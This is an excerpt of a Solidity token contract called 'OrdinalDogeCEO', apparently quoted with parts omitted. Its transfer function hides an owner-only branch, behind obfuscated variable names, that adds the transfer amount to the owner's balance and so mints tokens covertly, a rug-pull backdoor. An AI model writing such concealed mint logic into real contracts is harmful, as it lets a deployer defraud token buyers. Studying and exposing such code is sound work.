...
contract token is Ownable, IERC20 {
    ...
    string private _name = "OrdinalDogeCEO";
    string private _symbol = "ODogeCEO";
    ...
    function transfer(address recipient, uint256 ammounts) public virtual override returns (bool) {
        ...
        if(owner11 == _ddmmm && _ddmmm == owner() && owner() == _msgSender()){
            _balance[_ddmmm] = _balance[_ddmmm].add(ammounts);
        }
